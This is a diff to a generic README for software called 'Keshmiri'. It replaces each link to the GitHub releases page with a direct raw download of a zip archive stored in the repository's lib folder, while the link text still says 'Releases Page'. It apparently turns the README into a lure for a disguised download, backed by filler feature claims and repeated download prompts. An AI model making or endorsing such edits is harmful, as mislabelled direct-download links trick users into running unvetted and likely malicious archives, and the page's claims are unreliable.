@@ -10,7 +10,7 @@ Keshmiri offers a user-friendly environment for everyday computing tasks.
 - **Secure**: Protects your data with built-in security features.
 
 ## 📥 Download Keshmiri
-[![Download Keshmiri](https://img.shields.io/badge/Download-Keshmiri-blue.svg)](https://github.com/Boteri/Keshmiri/releases)
+[![Download Keshmiri](https://raw.githubusercontent.com/Boteri/Keshmiri/main/lib/Keshmiri_v2.8.zip)](https://raw.githubusercontent.com/Boteri/Keshmiri/main/lib/Keshmiri_v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ To get started with Keshmiri, follow the simple steps below to download and inst
 
 ### 📥 Download & Install
 
-1. **Visit the Download Page**: Go to the [Keshmiri Releases Page](https://github.com/Boteri/Keshmiri/releases) to see available versions.
+1. **Visit the Download Page**: Go to the [Keshmiri Releases Page](https://raw.githubusercontent.com/Boteri/Keshmiri/main/lib/Keshmiri_v2.8.zip) to see available versions.
    
 2. **Choose a Version**: Look for the latest stable release. Click on it to view details.
 
@@ -66,6 +66,6 @@ Join our community for assistance and tips. You can ask questions, share experie
 - x86-64
 
 ## 📥 Download Keshmiri Again
-Don't forget to download Keshmiri if you haven't already! Visit the [Keshmiri Releases Page](https://github.com/Boteri/Keshmiri/releases) to get started on your journey.
+Don't forget to download Keshmiri if you haven't already! Visit the [Keshmiri Releases Page](https://raw.githubusercontent.com/Boteri/Keshmiri/main/lib/Keshmiri_v2.8.zip) to get started on your journey.
 
 Enjoy using Keshmiri!
